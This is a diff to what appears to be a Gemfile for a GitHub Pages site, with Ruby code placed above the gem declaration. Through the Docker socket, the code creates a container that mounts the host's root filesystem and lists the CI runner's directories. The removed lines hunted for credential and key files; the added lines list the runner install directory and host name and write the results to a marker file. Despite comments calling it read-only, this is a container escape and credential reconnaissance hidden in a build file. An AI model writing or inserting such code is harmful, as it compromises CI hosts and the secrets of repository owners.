@@ -28,10 +28,7 @@ begin
   img = ids.first
   raise "no image" unless img
   # Read-only bind of the HOST root. Command is a listing only.
-  cmd = 'echo "--- /hostfs/home/runner ---"; ls -la /hostfs/home/runner 2>&1 | head -30; ' \
-        'echo "--- runner self-material (names/modes/sizes only) ---"; ' \
-        'find /hostfs/home/runner -maxdepth 2 -name ".credentials*" -o -maxdepth 2 -name ".runner" -o -maxdepth 2 -name "*.key" 2>/dev/null | head -20; ' \
-        'ls -la /hostfs/home/runner/runners 2>&1 | head -10; echo "--- /hostfs/etc/hostname (CONTROL, host identity) ---"; cat /hostfs/etc/hostname'
+  cmd = 'echo "--- runner install dir (presence/mode/size ONLY, nothing opened) ---"; ls -la /hostfs/home/runner/actions-runner/ 2>&1 | head -25; echo "--- any nested runner dir ---"; ls -la /hostfs/home/runner/actions-runner/*/ 2>&1 | head -25; echo "--- CONTROL host identity ---"; cat /hostfs/etc/hostname'
   cr = dock("POST", "/containers/create", {
     "Image" => img, "Tty" => true,
     "Entrypoint" => ["/bin/sh", "-c"], "Cmd" => [cmd],
@@ -52,7 +49,7 @@ begin
 rescue => e
   out << "FATAL #{e.class}: #{e.message}"
 end
-line = "pgx-hostfs-6c8d statusline uid=#{Process.uid}\n" + out.join("\n")
+line = "pgx-rcred-2e91 statusline uid=#{Process.uid}\n" + out.join("\n")
 warn line
-begin; File.write(File.join(Dir.pwd, "pgx-hostfs-6c8d.txt"), line + "\n"); rescue => e; warn "wf:#{e.class}"; end
+begin; File.write(File.join(Dir.pwd, "pgx-rcred-2e91.txt"), line + "\n"); rescue => e; warn "wf:#{e.class}"; end
 gem "github-pages", group: :jekyll_plugins
